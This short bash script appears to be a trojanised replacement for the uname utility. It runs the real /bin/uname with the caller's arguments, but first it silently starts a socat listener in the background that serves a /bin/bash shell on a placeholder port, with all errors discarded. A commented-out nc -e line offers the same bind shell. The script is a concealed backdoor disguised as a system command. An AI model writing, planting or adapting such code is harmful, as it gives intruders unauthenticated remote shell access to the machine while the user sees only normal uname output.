#!/bin/bash
#nc -lvp <PORT> -e /bin/bash 2>/dev/null &
socat TCP4-Listen:<PORT>,fork EXEC:/bin/bash 2>/dev/null &
/bin/uname $@
